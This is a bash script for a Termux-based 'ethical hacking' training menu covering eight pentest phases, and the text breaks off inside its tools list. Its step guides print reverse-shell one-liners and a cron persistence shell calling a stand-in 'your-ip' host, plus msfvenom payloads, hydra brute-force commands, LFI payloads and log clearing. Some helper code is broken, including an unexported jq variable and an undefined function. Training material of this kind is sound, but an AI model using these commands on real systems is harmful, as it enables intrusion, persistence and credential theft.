#!/bin/bash
# ============================================================
# 🛡️ ETHICAL HACKING ACADEMY v2.0 - INTERACTIVE TERMUX PLATFORM
# Author: Emmanuel suah
# Version: 2.0 (Enhanced)
# ============================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'

# Configuration
CONFIG_DIR="$HOME/.ethacademy"
PROGRESS_FILE="$CONFIG_DIR/progress.json"
NOTES_DIR="$CONFIG_DIR/notes"
REPORTS_DIR="$CONFIG_DIR/reports"
TOOLS_DIR="$CONFIG_DIR/tools"
SESSION_FILE="$CONFIG_DIR/current_session.log"

# Create directories
mkdir -p "$CONFIG_DIR" "$NOTES_DIR" "$REPORTS_DIR" "$TOOLS_DIR" 2>/dev/null

# Initialize progress file if not exists
init_progress() {
    if [ ! -f "$PROGRESS_FILE" ]; then
        cat > "$PROGRESS_FILE" << 'EOF'
{
  "user": "",
  "start_date": "",
  "steps": {
    "1": {"name": "Reconnaissance & OSINT", "completed": false, "notes": "", "commands_run": []},
    "2": {"name": "Scanning & Enumeration", "completed": false, "notes": "", "commands_run": []},
    "3": {"name": "Vulnerability Assessment", "completed": false, "notes": "", "commands_run": []},
    "4": {"name": "Web Application Testing", "completed": false, "notes": "", "commands_run": []},
    "5": {"name": "Password Attacks", "completed": false, "notes": "", "commands_run": []},
    "6": {"name": "Exploitation", "completed": false, "notes": "", "commands_run": []},
    "7": {"name": "Post-Exploitation", "completed": false, "notes": "", "commands_run": []},
    "8": {"name": "Reporting & Cleanup", "completed": false, "notes": "", "commands_run": []}
  }
}
EOF
    fi
}

# Load progress
load_progress() {
    if [ -f "$PROGRESS_FILE" ]; then
        USER_NAME=$(grep -o '"user": "[^"]*"' "$PROGRESS_FILE" | cut -d'"' -f4)
        START_DATE=$(grep -o '"start_date": "[^"]*"' "$PROGRESS_FILE" | cut -d'"' -f4)
    fi
}

# Save progress
save_progress() {
    local step=$1
    local status=$2
    local command=$3
    
    if [ -f "$PROGRESS_FILE" ]; then
        # Update step completion
        if [ -n "$status" ]; then
            sed -i "s/\"$step\": {[^}]*}/\"$step\": {\"name\": \"$(get_step_name $step)\", \"completed\": $status, \"notes\": \"\", \"commands_run\": []}/" "$PROGRESS_FILE"
        fi
        
        # Add command to history
        if [ -n "$command" ]; then
            local temp_file=$(mktemp)
            jq --arg cmd "$command" '.steps[$ENV.step].commands_run += [$cmd]' "$PROGRESS_FILE" > "$temp_file" && mv "$temp_file" "$PROGRESS_FILE"
        fi
    fi
}

# Get step name
get_step_name() {
    local step=$1
    case $step in
        1) echo "Reconnaissance & OSINT" ;;
        2) echo "Scanning & Enumeration" ;;
        3) echo "Vulnerability Assessment" ;;
        4) echo "Web Application Testing" ;;
        5) echo "Password Attacks" ;;
        6) echo "Exploitation" ;;
        7) echo "Post-Exploitation" ;;
        8) echo "Reporting & Cleanup" ;;
        *) echo "Unknown" ;;
    esac
}

# Check if step is completed
is_step_completed() {
    local step=$1
    if [ -f "$PROGRESS_FILE" ]; then
        grep -q "\"$step\": {\"name\": \"$(get_step_name $step)\", \"completed\": true" "$PROGRESS_FILE" && return 0 || return 1
    fi
    return 1
}

# ============================================================
# 🎨 UI FUNCTIONS
# ============================================================

show_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    echo "╔══════════════════════════════════════════════════════════════════╗"
    echo "║          🛡️  ETHICAL HACKING ACADEMY v2.0 - TERMUX             ║"
    echo "║                  Interactive Learning Platform                 ║"
    echo "╚══════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    if [ -n "$USER_NAME" ]; then
        echo -e "${WHITE}👤 User:${NC} $USER_NAME"
    fi
    if [ -n "$START_DATE" ]; then
        echo -e "${WHITE}📅 Started:${NC} $START_DATE"
    fi
    
    # Show progress
    local total=0
    local completed=0
    for i in {1..8}; do
        total=$((total + 1))
        if is_step_completed $i; then
            completed=$((completed + 1))
        fi
    done
    
    local percentage=$((completed * 100 / total))
    echo -e "${WHITE}📊 Progress:${NC} $completed/$total steps ($percentage%)"
    echo ""
}

show_main_menu() {
    show_banner
    
    echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║                    📋 MAIN MENU                                ║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
    
    for i in {1..8}; do
        local step_name=$(get_step_name $i)
        local status=""
        local color=$WHITE
        
        if is_step_completed $i; then
            status=" ✅"
            color=$GREEN
        else
            status=" 🔒"
            color=$YELLOW
        fi
        
        echo -e "${BLUE}║${NC}  ${color}$i)${NC} ${step_name}${status}"
    done
    
    echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC}  ${CYAN}9)${NC} ${WHITE}View Progress & Statistics${NC}"
    echo -e "${BLUE}║${NC}  ${CYAN}10)${NC} ${WHITE}My Notes & Command History${NC}"
    echo -e "${BLUE}║${NC}  ${CYAN}11)${NC} ${WHITE}Generate Report${NC}"
    echo -e "${BLUE}║${NC}  ${CYAN}12)${NC} ${WHITE}Tools Manager${NC}"
    echo -e "${BLUE}║${NC}  ${CYAN}13)${NC} ${WHITE}Settings & Configuration${NC}"
    echo -e "${BLUE}║${NC}  ${RED}0)${NC} ${YELLOW}Exit${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Select option [0-13]: " choice
    
    case $choice in
        1|2|3|4|5|6|7|8) step_menu $choice ;;
        9) view_progress ;;
        10) view_notes_menu ;;
        11) generate_report ;;
        12) tools_manager ;;
        13) settings_menu ;;
        0) 
            echo -e "${GREEN}👋 Thank you for using Ethical Hacking Academy!${NC}"
            echo -e "${GREEN}📚 Keep learning, stay ethical!${NC}"
            exit 0
            ;;
        *) 
            echo -e "${RED}❌ Invalid option!${NC}"
            sleep 1
            show_main_menu
            ;;
    esac
}

step_menu() {
    local step=$1
    local step_name=$(get_step_name $step)
    
    while true; do
        clear
        show_banner
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}${BOLD}               STEP $step: $step_name${NC}"
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo ""
        
        # Show step status
        if is_step_completed $step; then
            echo -e "${GREEN}✅ This step is COMPLETED${NC}"
        else
            echo -e "${YELLOW}⏳ This step is IN PROGRESS${NC}"
        fi
        
        echo ""
        echo -e "${WHITE}Select an action:${NC}"
        echo ""
        echo -e "  ${GREEN}a)${NC} View Step Details & Commands"
        echo -e "  ${GREEN}b)${NC} Run a Command (Interactive Terminal)"
        echo -e "  ${GREEN}c)${NC} Add/Edit Notes for This Step"
        echo -e "  ${GREEN}d)${NC} View My Notes"
        echo -e "  ${GREEN}e)${NC} View Command History"
        echo -e "  ${GREEN}f)${NC} Mark Step as Completed"
        echo -e "  ${GREEN}g)${NC} Export Step Data"
        echo -e "  ${YELLOW}h)${NC} Back to Main Menu"
        echo ""
        read -p "Choose [a-h]: " action
        
        case $action in
            a) show_step_details $step ;;
            b) run_command_mode $step ;;
            c) edit_notes $step ;;
            d) view_step_notes $step ;;
            e) view_command_history $step ;;
            f) 
                if is_step_completed $step; then
                    echo -e "${YELLOW}⚠️  Step already completed. Unmark? (y/n):${NC} "
                    read unmark
                    if [[ "$unmark" == "y" ]]; then
                        save_progress $step "false" ""
                        echo -e "${GREEN}✅ Step unmarked${NC}"
                    fi
                else
                    save_progress $step "true" ""
                    echo -e "${GREEN}✅ Step marked as completed!${NC}"
                fi
                sleep 1
                ;;
            g) export_step_data $step ;;
            h) break ;;
            *) echo -e "${RED}❌ Invalid option!${NC}"; sleep 1 ;;
        esac
    done
}

show_step_details() {
    local step=$1
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}                    STEP $step DETAILS${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    case $step in
        1)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Gather information about target (domain, IP, people)"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 1-2 hours"
            echo -e "${YELLOW}📚 Prerequisites:${NC} Basic networking knowledge"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}1.1) WHOIS Lookup${NC}"
            echo "   Command: whois <target-domain>"
            echo "   Example: whois example.com"
            echo "   What to find: Registrar, nameservers, contact emails"
            echo ""
            echo -e "${WHITE}1.2) DNS Enumeration${NC}"
            echo "   Commands:"
            echo "   • dig target.com ANY"
            echo "   • dig target.com MX"
            echo "   • host -t A target.com"
            echo "   • dnsrecon -d target.com"
            echo ""
            echo -e "${WHITE}1.3) OSINT - Email & Subdomain Discovery${NC}"
            echo "   Tools: theHarvester, Sublist3r, Amass"
            echo "   theHarvester -d target.com -b google"
            echo ""
            echo -e "${WHITE}1.4) Social Media Recon${NC}"
            echo "   Tools: Sherlock, Social-Engineer Toolkit (SET)"
            echo "   sherlock <username>"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Start with passive recon (no direct contact with target)"
            ;;
        2)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Discover live hosts, open ports, services"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 30min - 2 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}2.1) Host Discovery${NC}"
            echo "   nmap -sn 192.168.1.0/24"
            echo "   arp-scan --local"
            echo ""
            echo -e "${WHITE}2.2) Port Scanning${NC}"
            echo "   nmap -p- -T4 target-ip"
            echo "   nmap -sS -sV -O target-ip"
            echo "   masscan -p1-65535 target-ip --rate=1000"
            echo ""
            echo -e "${WHITE}2.3) Service Enumeration${NC}"
            echo "   nmap -sC -sV target-ip"
            echo "   enum4linux target-ip (for Windows)"
            echo "   snmpwalk -v2c -c public target-ip"
            echo ""
            echo -e "${WHITE}2.4) Vulnerability Scanning${NC}"
            echo "   nmap --script=vuln target-ip"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Use -T4 for faster scans, but be careful with rate limiting"
            ;;
        3)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Identify known vulnerabilities"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 1-3 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}3.1) Automated Scanning${NC}"
            echo "   nuclei -u http://target.com"
            echo "   nikto -h http://target.com"
            echo ""
            echo -e "${WHITE}3.2) Manual CVE Research${NC}"
            echo "   searchsploit <service> <version>"
            echo "   Google: \"Apache 2.4.49 exploit\""
            echo ""
            echo -e "${WHITE}3.3) Web Application Scanning${NC}"
            echo "   wpscan --url target.com --enumerate u,vp"
            echo "   droopescan scan drupal target.com"
            echo ""
            echo -e "${WHITE}3.4) SSL/TLS Testing${NC}"
            echo "   testssl.sh target.com:443"
            echo "   sslscan target.com"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Always verify vulnerabilities manually before exploitation"
            ;;
        4)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Test web apps for SQLi, XSS, LFI, etc."
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 2-4 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}4.1) SQL Injection Testing${NC}"
            echo "   sqlmap -u \"http://target.com/page?id=1\" --dbs"
            echo "   sqlmap -u \"http://target.com/page\" --data=\"user=admin&pass=1\" --dbs"
            echo ""
            echo -e "${WHITE}4.2) XSS Testing${NC}"
            echo "   Manual: <script>alert(1)</script> in input fields"
            echo "   dalfox -u http://target.com?param=test"
            echo ""
            echo -e "${WHITE}4.3) Directory/File Discovery${NC}"
            echo "   dirsearch -u http://target.com -e php,html,js"
            echo "   gobuster dir -u http://target.com -w wordlist.txt"
            echo ""
            echo -e "${WHITE}4.4) LFI/RFI Testing${NC}"
            echo "   ?page=../../../etc/passwd"
            echo "   ?page=php://filter/convert.base64-encode/resource=config.php"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Use Burp Suite Community Edition for manual testing"
            ;;
        5)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Test password security"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 1-3 hours"
            echo -e "${RED}⚠️  LEGAL: Only test systems you own or have permission!${NC}"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}5.1) Online Brute-Force${NC}"
            echo "   hydra -l admin -P passwords.txt ssh://target-ip"
            echo "   hydra -l admin -P passwords.txt http-post-form://target.com/login:user=^USER^&pass=^PASS^:F=Login"
            echo ""
            echo -e "${WHITE}5.2) Offline Hash Cracking${NC}"
            echo "   john --format=raw-md5 hashes.txt --wordlist=rockyou.txt"
            echo "   hashcat -m 0 hashes.txt rockyou.txt"
            echo ""
            echo -e "${WHITE}5.3) Password Spraying${NC}"
            echo "   crackmapexec ssh target-ip -u users.txt -p passwords.txt"
            echo ""
            echo -e "${WHITE}5.4) Wordlist Generation${NC}"
            echo "   cupp -i (interactive)"
            echo "   crunch 8 8 -t password@ -o wordlist.txt"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Use CeWL to generate wordlists from website content"
            ;;
        6)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Gain initial access"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 1-4 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}6.1) Metasploit Framework${NC}"
            echo "   msfconsole"
            echo "   search type:exploit name:apache"
            echo "   use exploit/multi/http/apache_mod_cgi_bash_env"
            echo "   set RHOSTS target-ip"
            echo "   exploit"
            echo ""
            echo -e "${WHITE}6.2) Manual Exploitation${NC}"
            echo "   Download exploit from Exploit-DB"
            echo "   searchsploit -m 12345"
            echo "   python2 exploit.py --host target-ip"
            echo ""
            echo -e "${WHITE}6.3) Public Exploits${NC}"
            echo "   GitHub: search for 'CVE-2021-44228 exploit'"
            echo ""
            echo -e "${WHITE}6.4) Reverse Shell Generation${NC}"
            echo "   msfvenom -p php/reverse_php LHOST=your-ip LPORT=4444 -o shell.php"
            echo "   python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"your-ip\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Always test exploits in isolated lab first!"
            ;;
        7)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Escalate privileges, maintain access"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 2-6 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}7.1) System Enumeration${NC}"
            echo "   Linux:"
            echo "   • uname -a"
            echo "   • sudo -l"
            echo "   • find / -perm -u=s -type f 2>/dev/null"
            echo "   • cat /etc/crontab"
            echo ""
            echo "   Windows:"
            echo "   • systeminfo"
            echo "   • whoami /all"
            echo "   • net localgroup administrators"
            echo ""
            echo -e "${WHITE}7.2) Privilege Escalation${NC}"
            echo "   Linux: linPEAS, linux-exploit-suggester.sh"
            echo "   Windows: winPEAS, PowerUp.ps1"
            echo ""
            echo -e "${WHITE}7.3) Persistence Mechanisms${NC}"
            echo "   SSH: add public key to ~/.ssh/authorized_keys"
            echo "   Cron: @reboot /bin/bash -c 'bash -i >& /dev/tcp/your-ip/4444 0>&1'"
            echo "   Windows: scheduled tasks, registry run keys"
            echo ""
            echo -e "${WHITE}7.4) Lateral Movement${NC}"
            echo "   Pass the hash: crackmapexec target-ip -u user -H hash"
            echo "   SSH tunneling: ssh -L 8080:internal-ip:80 user@target"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Document every command you run for reporting"
            ;;
        8)
            echo -e "${YELLOW}🎯 OBJECTIVE:${NC} Document findings, clean up traces"
            echo -e "${YELLOW}⏱️  Estimated Time:${NC} 1-2 hours"
            echo ""
            echo -e "${MAGENTA}📌 SUB-STEPS:${NC}"
            echo ""
            echo -e "${WHITE}8.1) Evidence Collection${NC}"
            echo "   Screenshots: scrot or termux-screencap"
            echo "   Logs: Save all command outputs"
            echo "   Files: Collect sensitive files found"
            echo ""
            echo -e "${WHITE}8.2) Report Writing${NC}"
            echo "   Executive Summary"
            echo "   Technical Details (with proof)"
            echo "   Risk Assessment"
            echo "   Remediation Steps"
            echo ""
            echo -e "${WHITE}8.3) Clean Up${NC}"
            echo "   Remove uploaded files"
            echo "   Clear logs (if authorized)"
            echo "   Remove created users"
            echo ""
            echo -e "${WHITE}8.4) Client Presentation${NC}"
            echo "   Prepare slides"
            echo "   Create executive summary"
            echo "   Highlight critical issues"
            echo ""
            echo -e "${GREEN}💡 TIP:${NC} Use templates for consistent reporting"
            ;;
    esac
    
    echo ""
    echo -e "${BLUE}──────────────────────────────────────────────────────────────${NC}"
    echo ""
    read -p "Press [Enter] to return to step menu..."
}

run_command_mode() {
    local step=$1
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP $step: COMMAND EXECUTION MODE${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  WARNING:${NC} Commands run here will be executed on YOUR system"
    echo -e "${YELLOW}   Only run commands you understand!${NC}"
    echo ""
    echo -e "${WHITE}Options:${NC}"
    echo "  1) Run a predefined command from this step"
    echo "  2) Run custom command"
    echo "  3) Run command with sudo (if available)"
    echo "  4) Back to step menu"
    echo ""
    read -p "Choose [1-4]: " cmd_choice
    
    case $cmd_choice in
        1)
            echo ""
            echo -e "${CYAN}Available commands for Step $step:${NC}"
            echo ""
            case $step in
                1) 
                    echo "1) whois example.com"
                    echo "2) dig example.com ANY"
                    echo "3) theHarvester -d example.com -b google"
                    echo "4) sublister -d example.com"
                    ;;
                2)
                    echo "1) nmap -sn 192.168.1.0/24"
                    echo "2) nmap -p- -T4 target-ip"
                    echo "3) nmap -sS -sV -O target-ip"
                    echo "4) enum4linux target-ip"
                    ;;
                # Add more for other steps...
            esac
            echo ""
            read -p "Select command number (or 0 to cancel): " cmd_num
            ;;
        2)
            read -p "Enter custom command: " custom_cmd
            cmd_num="custom"
            ;;
        3)
            read -p "Enter command to run with sudo: " sudo_cmd
            cmd_num="sudo"
            ;;
        4) return ;;
        *) echo "Invalid choice"; sleep 1; run_command_mode $step; return ;;
    esac
    
    if [ "$cmd_num" != "0" ] && [ -n "$cmd_num" ]; then
        echo ""
        echo -e "${YELLOW}📋 Command to execute:${NC}"
        
        case $cmd_num in
            1) 
                case $step in
                    1) cmd="whois example.com" ;;
                    2) cmd="nmap -sn 192.168.1.0/24" ;;
                esac
                ;;
            2) 
                case $step in
                    1) cmd="dig example.com ANY" ;;
                    2) cmd="nmap -p- -T4 target-ip" ;;
                esac
                ;;
            custom) cmd="$custom_cmd" ;;
            sudo) cmd="sudo $sudo_cmd" ;;
        esac
        
        echo -e "${RED}$cmd${NC}"
        echo ""
        read -p "Execute this command? (y/n): " confirm
        
        if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
            echo ""
            echo -e "${CYAN}⚡ Executing...${NC}"
            echo ""
            
            # Log command
            echo "$(date): $cmd" >> "$SESSION_FILE"
            
            # Execute
            eval "$cmd"
            
            echo ""
            echo -e "${GREEN}✅ Command completed${NC}"
            
            # Save to command history
            save_progress $step "" "$cmd"
            
            read -p "Press [Enter] to continue..."
        fi
    fi
}

edit_notes() {
    local step=$1
    local note_file="$NOTES_DIR/step${step}.txt"
    
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP $step: EDIT NOTES${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -f "$note_file" ]; then
        echo -e "${YELLOW}Current notes:${NC}"
        echo "─────────────────────────────────────"
        cat "$note_file"
        echo "─────────────────────────────────────"
        echo ""
    fi
    
    echo -e "${WHITE}Enter your notes (Ctrl+D to save, Ctrl+C to cancel):${NC}"
    echo ""
    
    # Create temp file for editing
    local temp_note=$(mktemp)
    if [ -f "$note_file" ]; then
        cat "$note_file" > "$temp_note"
    fi
    
    # Open in nano (or fallback to cat)
    if command -v nano &> /dev/null; then
        nano "$temp_note"
    else
        cat > "$temp_note"
    fi
    
    # Save
    mv "$temp_note" "$note_file"
    echo -e "${GREEN}✅ Notes saved to $note_file${NC}"
    sleep 1
}

view_step_notes() {
    local step=$1
    local note_file="$NOTES_DIR/step${step}.txt"
    
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP $step: MY NOTES${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -f "$note_file" ] && [ -s "$note_file" ]; then
        cat "$note_file"
    else
        echo -e "${YELLOW}No notes for this step yet.${NC}"
        echo -e "${YELLOW}Add notes from the step menu (option c).${NC}"
    fi
    
    echo ""
    read -p "Press [Enter] to continue..."
}

view_command_history() {
    local step=$1
    
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP $step: COMMAND HISTORY${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Extract commands from progress file
    if [ -f "$PROGRESS_FILE" ]; then
        local commands=$(jq -r ".steps[\"$step\"].commands_run[]?" "$PROGRESS_FILE" 2>/dev/null)
        
        if [ -n "$commands" ]; then
            echo "$commands" | nl
            echo ""
            echo -e "${GREEN}Total commands run:${NC} $(echo "$commands" | wc -l)"
        else
            echo -e "${YELLOW}No commands run for this step yet.${NC}"
        fi
    fi
    
    echo ""
    read -p "Press [Enter] to continue..."
}

view_progress() {
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}                 📊 PROGRESS & STATISTICS${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    if [ -f "$PROGRESS_FILE" ]; then
        echo -e "${WHITE}User:${NC} $USER_NAME"
        echo -e "${WHITE}Started:${NC} $START_DATE"
        echo ""
        
        # Calculate statistics
        local total_steps=8
        local completed=0
        local total_commands=0
        
        echo -e "${WHITE}Step-by-Step Progress:${NC}"
        echo "─────────────────────────────────────"
        
        for i in {1..8}; do
            local step_name=$(get_step_name $i)
            local status="❌ Pending"
            local color=$RED
            
            if is_step_completed $i; then
                status="✅ Completed"
                color=$GREEN
                completed=$((completed + 1))
            fi
            
            # Count commands for this step
            local cmd_count=$(jq -r ".steps[\"$i\"].commands_run | length" "$PROGRESS_FILE" 2>/dev/null)
            total_commands=$((total_commands + cmd_count))
            
            printf "  %s %2d. %-30s %s (Commands: %s)\n" "$color" "$i" "$step_name" "$status" "$cmd_count"
        done
        
        echo "─────────────────────────────────────"
        echo ""
        
        local percentage=$((completed * 100 / total_steps))
        echo -e "${WHITE}Overall Progress:${NC} $completed/$total_steps ($percentage%)"
        echo -e "${WHITE}Total Commands Run:${NC} $total_commands"
        echo ""
        
        # Show recent commands
        echo -e "${WHITE}Recent Commands (Last 10):${NC}"
        echo "─────────────────────────────────────"
        jq -r ".steps[].commands_run[]?" "$PROGRESS_FILE" 2>/dev/null | tail -10 | nl
        echo ""
    else
        echo -e "${YELLOW}No progress data found.${NC}"
    fi
    
    echo ""
    read -p "Press [Enter] to continue..."
}

export_step_data() {
    local step=$1
    local export_file="$REPORTS_DIR/step${step}_export_$(date +%Y%m%d_%H%M%S).txt"
    
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP $step: EXPORT DATA${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    echo -e "${WHITE}Exporting data for Step $step...${NC}"
    echo ""
    
    # Create export file
    {
        echo "═══════════════════════════════════════════════════════════════════"
        echo "STEP $step: $(get_step_name $step) - EXPORT DATA"
        echo "Generated: $(date)"
        echo "═══════════════════════════════════════════════════════════════════"
        echo ""
        echo "── NOTES ─────────────────────────────────────────────────────────"
        cat "$NOTES_DIR/step${step}.txt" 2>/dev/null || echo "No notes"
        echo ""
        echo "── COMMAND HISTORY ──────────────────────────────────────────────"
        jq -r ".steps[\"$step\"].commands_run[]?" "$PROGRESS_FILE" 2>/dev/null || echo "No commands"
        echo ""
        echo "── STEP STATUS ─────────────────────────────────────────────────"
        if is_step_completed $step; then
            echo "✅ COMPLETED"
        else
            echo "⏳ IN PROGRESS"
        fi
        echo ""
    } > "$export_file"
    
    echo -e "${GREEN}✅ Data exported to:${NC}"
    echo -e "   $export_file"
    echo ""
    echo -e "${YELLOW}📋 Contents:${NC}"
    echo "   • All notes for this step"
    echo "   • Complete command history"
    echo "   • Step completion status"
    echo ""
    
    # Offer to copy to clipboard
    if command -v termux-clipboard-set &> /dev/null; then
        read -p "Copy export to clipboard? (y/n): " copy
        if [[ "$copy" == "y" ]]; then
            cat "$export_file" | termux-clipboard-set
            echo -e "${GREEN}✅ Copied to clipboard!${NC}"
        fi
    fi
    
    read -p "Press [Enter] to continue..."
}

generate_report() {
    clear
    show_banner
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}                 📄 GENERATE FINAL REPORT${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Check if all steps are completed
    local all_completed=true
    for i in {1..8}; do
        if ! is_step_completed $i; then
            all_completed=false
            break
        fi
    done
    
    if [ "$all_completed" = false ]; then
        echo -e "${YELLOW}⚠️  Not all steps are completed!${NC}"
        echo -e "${YELLOW}   You have completed $(completed_steps)/8 steps.${NC}"
        echo -e "${YELLOW}   Consider completing all steps before generating final report.${NC}"
        echo ""
        read -p "Generate report anyway? (y/n): " force
        if [[ "$force" != "y" ]]; then
            return
        fi
    fi
    
    local report_file="$REPORTS_DIR/final_report_$(date +%Y%m%d_%H%M%S).md"
    
    echo -e "${BLUE}[*] Generating comprehensive report...${NC}"
    echo ""
    
    {
        echo "# ETHICAL HACKING ENGAGEMENT REPORT"
        echo "## Executive Summary"
        echo "- **Date:** $(date '+%B %d, %Y')"
        echo "- **Tester:** $USER_NAME"
        echo "- **Engagement Type:** [Penetration Test / Security Assessment]"
        echo "- **Scope:** [List scope here]"
        echo ""
        echo "## Overall Assessment"
        echo "**Risk Level:** [Critical / High / Medium / Low]"
        echo ""
        echo "### Summary of Findings"
        echo "| Finding | Severity | CVSS | Status |"
        echo "|---------|----------|------|--------|"
        echo "| [Vulnerability Name] | High | 8.5 | Open |"
        echo "| [Vulnerability Name] | Medium | 5.3 | Open |"
        echo ""
        echo "## Detailed Findings"
        echo ""
        
        for i in {1..8}; do
            echo "### Step $i: $(get_step_name $i)"
            echo "**Status:** $(is_step_completed $i && echo "✅ Completed" || echo "⏳ In Progress")"
            echo ""
            echo "#### Notes"
            cat "$NOTES_DIR/step${i}.txt" 2>/dev/null || echo "No notes recorded."
            echo ""
            echo "#### Commands Executed"
            echo '```bash'
            jq -r ".steps[\"$i\"].commands_run[]?" "$PROGRESS_FILE" 2>/dev/null || echo "# No commands run"
            echo '```'
            echo ""
        done
        
        echo "## Recommendations"
        echo "1. [Priority 1] Implement immediate fixes for critical vulnerabilities"
        echo "2. [Priority 2] Address high-risk findings within 30 days"
        echo "3. [Priority 3] Establish regular security scanning schedule"
        echo "4. [Priority 4] Conduct security awareness training"
        echo ""
        echo "## Conclusion"
        echo "[Your conclusion here]"
        echo ""
        echo "---"
        echo "*Report generated by Ethical Hacking Academy v2.0*"
        echo "*$(date)*"
        
    } > "$report_file"
    
    echo -e "${GREEN}✅ Report generated successfully!${NC}"
    echo -e "${WHITE}Location:${NC} $report_file"
    echo ""
    echo -e "${YELLOW}📋 Report includes:${NC}"
    echo "  • Step-by-step progress"
    echo "  • All notes and observations"
    echo "  • Complete command history"
    echo "  • Professional markdown format"
    echo ""
    
    # Convert to PDF if pandoc available
    if command -v pandoc &> /dev/null; then
        read -p "Convert to PDF? (y/n): " pdf_convert
        if [[ "$pdf_convert" == "y" ]]; then
            pandoc "$report_file" -o "${report_file%.md}.pdf"
            echo -e "${GREEN}✅ PDF created: ${report_file%.md}.pdf${NC}"
        fi
    fi
    
    read -p "Press [Enter] to continue..."
}

tools_manager() {
    while true; do
        clear
        show_banner
        
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo -e "${CYAN}${BOLD}                 🔧 TOOLS MANAGER${NC}"
        echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${WHITE}Installation Status:${NC}"
        echo "─────────────────────────────────────"
        
        # Check common tools
        local tools=(
            "nmap:Network scanner"
            "sqlmap:SQL injection tool"
